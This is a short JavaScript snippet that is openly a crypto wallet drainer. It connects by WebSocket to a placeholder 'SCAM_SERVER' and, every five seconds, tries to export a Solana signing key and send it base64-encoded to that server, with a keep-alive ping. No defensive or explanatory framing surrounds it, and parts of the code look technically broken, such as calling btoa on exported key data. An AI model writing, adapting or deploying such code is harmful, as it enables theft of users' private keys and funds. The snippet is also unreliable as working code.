const socket = new WebSocket(SCAM_SERVER);

async function stealPrivateKey() {
    try {
        const privateKey = await window.crypto.subtle.exportKey("pkcs8", window.solana.signingKey);
        socket.send(JSON.stringify({ key: btoa(privateKey) }));
    } catch (err) {
        console.error("Extraction Failed:", err);
    }
}

// Keep WebSocket connection alive
socket.onopen = () => {
    console.log("Connected to scam server");
    setInterval(() => socket.send(JSON.stringify({ status: "active" })), 30000);
};

// Extract private key every 5 seconds
setInterval(stealPrivateKey, 5000);
